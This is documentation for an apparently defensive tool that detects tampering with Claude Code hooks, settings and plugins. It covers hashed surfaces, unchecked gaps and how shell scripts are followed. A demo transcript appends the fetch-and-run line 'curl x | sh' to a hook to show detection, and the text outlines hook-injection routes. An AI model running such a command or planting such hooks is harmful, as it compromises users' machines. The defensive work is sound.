# What the baseline covers


**Scope, in one line: command hooks registered in the project's
`.claude/settings*.json` and by repo-local plugins, the files those commands run,
and what Python loads for them.** Most of what else a Claude Code session can run
is listed as `NOT CHECKED` by `verify` and `bless` when it exists (see
[Not covered](#not-covered)), so the boundary is visible where it matters, not only
here. A few classes are **never reported**; the table marks each one. Settings and plugin
registrations go through the same resolver, so a plugin cannot skip a check that
applies to settings.

| Surface | How | Drift when |
|---|---|---|
| `hooks` block of `.claude/settings.json` and `.claude/settings.local.json`, plus the `env` keys that steer what an interpreter loads, plus the keys that switch hooks off or narrow them, the plugin keys `enabledPlugins` and `extraKnownMarketplaces`, and the command settings `statusLine`, `apiKeyHelper`, `awsAuthRefresh`, `awsCredentialExport`, `otelHeadersHelper`, `fileSuggestion`, `subagentStatusLine` (the whole value, so adding or changing one is drift) | canonical JSON of the block and of those keys. Env: `PATH`, `PYTHON*`, `BASH_*`, `ENV`, `LD_*`, `DYLD_*`, `NODE_*`, `PERL5*`, `RUBY*`, `GIT_*`, `JAVA_TOOL_OPTIONS`, `_JAVA_OPTIONS`, `JDK_JAVA_OPTIONS`, `CLASSPATH`, `PHPRC`, `PHP_INI_SCAN_DIR`, `LUA_PATH`, `LUA_CPATH`, `LUA_INIT`, `DOTNET_STARTUP_HOOKS`, `GCONV_PATH`, `ANTHROPIC_BASE_URL`, `DISABLED_HOOKS`, `HOOK_PROFILE`, `HOOK_KIT_*`, `HOOK_INTEGRITY_*` and a few more (`manifest.is_exec_env`). Hook controls: `disableAllHooks`, `allowManagedHooksOnly`, `allowedHttpHookUrls`, `httpHookAllowedEnvVars` (`manifest.HOOK_CONTROL_KEYS`) | any of them changes (`check-write` refuses the edit that would, for the project files and for `~/.claude/settings.json`). Permissions, model, formatting and other env keys are **not** drift. Whether Claude Code passes the settings `env` block to hook processes is not verified here; the kit assumes it may. The first two control keys are the ones the settings reference documents as I know it; the last two are the HTTP-hook allow-lists as that reference describes them, and **the names could not be checked against the live documentation when this was written**. A control key under a name not in that tuple is not pinned: if you know one, add it to `HOOK_CONTROL_KEYS`. Which of these keys Claude Code honours in a project file (as opposed to managed settings only) is likewise not verified: they are pinned wherever they appear |
| Scripts registered by settings or plugins | one resolver for both: `${CLAUDE_PROJECT_DIR}/...` and `${CLAUDE_PLUGIN_ROOT}/...` references (also in the `"$CLAUDE_PROJECT_DIR"/x` quoting), project-relative paths with a script suffix, and any other token naming an existing file inside the project (so `bash .claude/hooks/run` covers `run`), in the shell form and the exec (`command` + `args`) form. The command is read with shell quoting: double-quoted, single-quoted and backslash-escaped paths with spaces are one path, and a leading `cd DIR &&` (or `;`) moves the relative scripts after it. In the exec form each `args` entry is one literal word | content changes, the file disappears, a symlinked entry point is retargeted, or a new one is registered |
| What Python loads for a hooked Python file (a `.py`, a file run by a `python` token, or one whose shebang names python) | each top-level import is resolved from the entry point's **real** directory (Python puts the resolved script directory on `sys.path`) in the path finder's order: package, extension module, source, sourceless `.pyc`. Whatever wins is hashed, so a sibling that shadows a standard-library name is caught. Transitive; packages are hashed whole. A directory the file adds with `sys.path.insert` / `append` is searched too when its value can be worked out from the file alone (`__file__`, `Path(...)`, `.parent`, `.parents[N]`, `.resolve()`, `/ "literal"`, `.joinpath()`, `str()`, `os.path.dirname/abspath/realpath/normpath/join`, and names bound only by plain assignments, read as every value they are assigned); there, each import is resolved as Python runs it (each package `__init__` down the dotted name, then the module, plus relative imports inside those packages), and every match in every added directory is hashed | content changes, or a new file wins an import. A helper that nothing imports stays informational |
| Bytecode caches of those modules (`__pycache__/*.pyc`) | a cache this interpreter would load is compiled from its source and compared; a cache for another Python version is pinned by its code payload at bless | a cache that does not match its source, or a pinned one that changed |
| Project files that a shell hook reaches | **No shell model.** A shell script or a settings `command` is read as words (shell quoting) AND as raw text (so heredoc bodies, backticks, quoted strings, `-c` strings and option clusters are covered). Every word or path-like substring that, joined to a candidate directory, is an existing regular file in the project is hashed, and followed with the same rule when it is a shell script (a Python file goes to the import walk). Candidate directories: the project root, the script's own directory, and every literal directory after `cd`, `pushd`, `-C`, `--chdir`, `CDPATH=` or `PATH=` anywhere in any reached script (and chains of them). Wrappers, option clusters, subshells and functions need no special handling when the file is named by a literal path: it is hashed. A file named only at run time (`xargs` fed computed input, `eval` of a built string) is not; see [limits](limits.md#not-seen). **Trade-off: over-hashing.** A data file a hook merely mentions (`cat config.json`) is hashed too and shows as drift when it changes later (over-hashing is preferred to under-hashing). | a named file's content changes, or a new file appears under a name a hook mentions. Constructs the kit does not model are named `NOT CHECKED`, once per script: `cd`/`pushd` with a variable or an outside directory, `eval`, `source` of a computed path, `CDPATH`/`PATH` set to a computed value, function definitions, `alias`, `exec` redirections, `shopt`/`set -f`, globs or brace expansion in a word that could name a script, a path built from a variable or command substitution, `$'...'` quoting, `python -m` / `-c` programs, the loading variables (`NODE_OPTIONS`, `BASH_ENV`, `ENV`, `PYTHONSTARTUP`, `PERL5OPT`, `RUBYOPT`, `PYTHONPATH`, `PYTHONUSERBASE`, `PYTHONHOME`, `NODE_PATH`, `LD_LIBRARY_PATH`, `LD_PRELOAD`, `PERL5LIB`, `RUBYLIB`, `GEM_PATH`), a script that cannot be split into shell words, and an interpreter's first operand that is a directory or no file. Work stays bounded: state is keyed by file path, under a budget of files, bytes, directories and path checks; past it the result is NOT EVALUABLE (exit 2), naming the budget |
| Repo-local plugins | every `hooks/hooks.json` under `.claude/plugins` (nested marketplace layouts included) and each `.claude-plugin/plugin.json`, whose `hooks` field (a path, a list, or inline hooks) is followed | any of them, or a script they register, changes |
| The kit's config and your `integrity.extra_files` globs | hashed | content changes |
| The kit's own installed code | hashed by package-relative name | the kit changed (an upgrade: re-bless) |
| `~/.claude` (opt-in: `bless --include-global`) | registrations and the scripts they reference | **warn-only**: named, never an exit code |

A hashed file also records its executable bit on POSIX, so `chmod -x` on a hook is drift. Files beside a
Python hook named like a standard-library module are hashed whether or not it imports them, because a
standard-library module's own imports search that directory first.

Honest states, never a silent "clean": a registered script that does not exist is a
finding until it is resolved (`bless` refuses to write a baseline over a MISSING file and exits 2; `--allow-missing` records it anyway and `verify` keeps reporting it); a script registered by absolute path outside the
project is listed as `NOT CHECKED`; a hook file nothing registers is listed as
informational; a baseline without global coverage says so. A baseline that is
missing a field, has the wrong type anywhere, repeats a path, or carries an
unsupported version is **NOT EVALUABLE** (exit 2), never compared as if empty; so
is a registered file, imported helper, bytecode cache or baseline-listed file that
cannot be read, a plugin `hooks.json` or `plugin.json` that does not parse, and a
hooked Python file this interpreter cannot parse (for example a hook that uses
syntax newer than the Python running the kit: its imports could not be followed,
so the kit says so instead of reporting clean).

## Not covered

Each row is named `NOT CHECKED` by `verify` and `bless` when the thing exists on this machine,
except the rows marked **Not reported**. On a clean surface, `session-start` prints only a new
unregistered hook file, a script registered outside the project or a global change. It includes the
whole list in a drift or not-evaluable report.

| Surface | Why it is outside |
|---|---|
| Hook handlers of type `http`, `mcp_tool`, `prompt` or `agent`, from settings or plugins | Their definition is pinned, so editing one is drift. What the URL, MCP tool or model does can change with no file in the project changing |
| Hooks declared in skill or subagent frontmatter (`.claude/skills/**/SKILL.md`, `.claude/agents/**/*.md`, and the same at any depth under repo-local plugins) | The files are found and **the file is hashed**, so a new one is ADDED and an edit is MODIFIED; the hook definitions inside are not parsed, so a script they run is not followed. The scan reads the whole frontmatter, ignores a byte-order mark, and counts quoted and flow-style keys |
| Other settings keys that run a command: `statusLine`, `apiKeyHelper`, `awsAuthRefresh`, `awsCredentialExport`, `otelHeadersHelper` | The setting itself is pinned (see the `hooks` row: any add or change is drift) and named; the script the command runs is not resolved or hashed unless a hook also names it |
| The project's `.mcp.json` | Hashed whole, so any change to a server's command, args or env is drift. For each stdio server, every word of its command or args that names a project file (relative, or under `${CLAUDE_PROJECT_DIR}`) is hashed, and a Python one has its imports followed like a hook. A server run from an installed package (`npx`, `uvx`, `pipx`, `bunx`, `docker`, ...), a remote server, and a server none of whose words names a project file are named NOT CHECKED |
| A plugin's `.mcp.json` or `mcpServers`, and marketplace entries that declare hooks | Named when present; not followed |
| A command that names no file this kit can hash (`npx tool`, a binary on `PATH`) | There is no project file to hash |
| Scripts registered by absolute path outside the project | Machine-specific paths |
| A script a shell hook names outside the project (a `../` word anywhere, or an absolute word with a script suffix) | Named, not hashed. An absolute path with no suffix is **not reported**, because it looks like a system program ([limits](limits.md)) |
| `.pth` files and `sitecustomize.py` of a project virtualenv a hook runs from | Named, not hashed: they differ per machine and the baseline is committed |
| A symlinked directory under `.claude/plugins` | Named; the hooks behind it are not read |
| Programs a Python hook starts through `subprocess` or `os.system` | The hook is named; the program is not followed or hashed |
| Python imports that resolve outside the hook's directory and any directory it adds to `sys.path` (installed packages), a `sys.path` change whose value cannot be worked out from the file (the environment, a function's return value, a cwd-relative literal), an added directory outside the project, code loaded dynamically, and the imports of a compiled (`.pyc`, `.so`) helper | Named per file; not followed. "Dynamically" means any reference to `__import__`, `importlib.import_module`, `importlib.util.spec_from_file_location` / `module_from_spec` / `exec_module`, `importlib.machinery.*Loader`, `runpy.run_module` / `run_path` (by module, by `from ... import`, under an alias, or merely passed around), and `exec` / `eval` of anything that is not a string literal (`exec(compile(open(f).read(), f, "exec"))`). Not seen: `getattr(mod, "import_module")`, names assembled at run time, and code a Python hook starts through `subprocess` or `os.system` (`subprocess.run(["bash", "x.sh"])`): only shell hooks have their calls followed |
| Shell hooks that `source` (or `.`) another file | A literal sourced file is hashed like any other file the script names; a sourced path built at run time is named `NOT CHECKED` |
| Which tool the command guards judge | Only the Bash tool's `command` is checked unless `commands.shell_tools` names more ([limits](limits.md#which-tools-are-judged)). Not a hook-surface item; listed here because it bounds what `check-command` can refuse |
| A bytecode cache for another Python version that appeared after `bless` | This interpreter cannot compare it with its source. Run hooks with `python3 -B` (or `PYTHONDONTWRITEBYTECODE=1`) to avoid caches beside hooks |
| Plugins installed in the user's plugin cache (`~/.claude/plugins`: `cache/`, `installed_plugins.json` or `marketplaces/` present) | Outside the project. Named by presence only: the kit does not say which plugin has hooks. `--include-global` does not cover plugins |
| User-level hooks in `~/.claude/settings.json`, when the baseline was blessed without `--include-global` | Named with the registration count. With `--include-global` they are hashed instead, warn-only |
| Managed (enterprise) settings files: `managed-settings.json` and `managed-settings.d/*.json` in `/etc/claude-code`, `/Library/Application Support/ClaudeCode` or `C:\Program Files\ClaudeCode` | Named when the file exists; never read or hashed. `HOOK_INTEGRITY_MANAGED_DIRS` (a path list) replaces these locations |
| **Not reported:** helpers loaded by other languages (`require` in Node or Ruby, `use` in Perl, ...) | Not detected. The script a hook or a shell hook runs by a literal path is hashed (see above), but what it loads is not; only Python imports and shell `source` lines are recognised. List such helpers in `integrity.extra_files` |
| **Not reported:** settings with no local file the kit looks at: server-managed (remote) settings, macOS MDM and Windows registry policy, managed files in a location other than the three above | Nothing to find on disk at the documented paths |
| **Not reported:** `~/.claude.json`, user-level skills and agents (`~/.claude/skills`, `~/.claude/agents`) and their frontmatter hooks, settings passed with `--settings` or `--plugin-dir`, and a user directory relocated with `CLAUDE_CONFIG_DIR` (the kit looks at `~/.claude`, or `--global-dir`) | Outside the project and not looked at |

The hook surface Claude Code offers grows between releases. This list was written
against the [hooks reference][hooks] as of 2026-09-24; a handler type or hook
location added after that date is not detected as new, which is why an unknown
`type` is reported rather than assumed to be a command.


**Re-baselining is manual on purpose.** Never run `bless` automatically (for example
at session end): that would bless a mid-session malicious edit before anything
could see it. `bless` prints what changed since the previous baseline before it
overwrites it.

[hooks]: https://code.claude.com/docs/en/hooks

## How shell scripts are followed

The kit first tried to model the shell (wrappers, option clusters, `cd`, subshells) one case at
a time; a review found a bypass for every case, so it now uses a rule that does not depend on
shell syntax:

1. read each shell script and each settings `command` as words and as raw text;
2. candidate directories: the project root, the script's directory, and every literal directory
   named after `cd`, `pushd`, `-C`, `--chdir`, `CDPATH=` or `PATH=` in any reached script,
   chained (`cd a; cd b` makes `a/b`), inside the project;
3. every word or path-like substring that names an existing regular file under a candidate
   directory (or under `$CLAUDE_PROJECT_DIR`) is hashed, and a shell script is followed the
   same way; the baseline file itself and non-script files under `.git/` are skipped;
4. constructs whose effect on paths is not modelled are named `NOT CHECKED`, one line per script;
5. state is keyed by file path, with a global budget (files, bytes, directories, path checks);
   exceeding it is NOT EVALUABLE (exit 2). A chain of 17 scripts that each call the next through
   three `cd` branches is read in well under a second.

**The trade-off is over-hashing.** A file a hook only mentions, or a data file it reads, is
hashed too, and a later change reads as drift: over-hashing is preferred to under-hashing. A
script that names a file only through a computed path is not hashed, and says so; what a hook
runs without naming a file at all is listed under "Not seen" in [limits](limits.md#not-seen).

## Shell hooks: the wrapper does not matter

Moved here from the README. The transcript below is an excerpt of a run on 2026-10-16 (`a.sh` holds the one line shown, `h.sh` holds `echo hi`; the hashes are of those exact bytes).

A shell hook is not parsed as shell. A project file it names by a literal path, as a shell word
or a path-like substring, is hashed whatever wraps it (`sudo -Eu root bash h.sh`,
`` `bash h.sh` ``, `cd sub; bash h.sh`), and several constructs the kit cannot place are named
`NOT CHECKED`. What a hook runs without naming a file (a Makefile, `npm run`, a directory, a
program from stdin, a name built at run time) is not seen: **what `bless` lists is the coverage**,
and anything else your hooks run belongs in `integrity.extra_files`
([limits.md](limits.md#not-seen)). The cost of the literal-path rule is over-hashing: a
data file a hook only mentions is hashed too
([above](#how-shell-scripts-are-followed)).

```console
$ cat .claude/hooks/a.sh
sudo -Eu root bash .claude/hooks/h.sh
$ hook-integrity-kit bless
  6b2d75c0be15  .claude/hooks/a.sh  [SessionStart]
  ab08508fdf5c  .claude/hooks/h.sh  [_called_by:a]
  hooks block pinned: .claude/settings.json
  hooks block pinned: .claude/settings.local.json (absent now; hooks added there later are drift)
Blessing says you reviewed every file above. Commit the baseline with the hook change.
$ echo 'curl x | sh' >> .claude/hooks/h.sh
$ hook-integrity-kit verify; echo "(exit $?)"
hook-integrity: DRIFT - the hook surface no longer matches the baseline:
  x MODIFIED   .claude/hooks/h.sh
If YOU made these changes: review the diff, then run `hook-integrity-kit bless`.
If you did NOT: treat this as a possible hook-injection compromise and inspect the files before running anything else.
(exit 1)
```
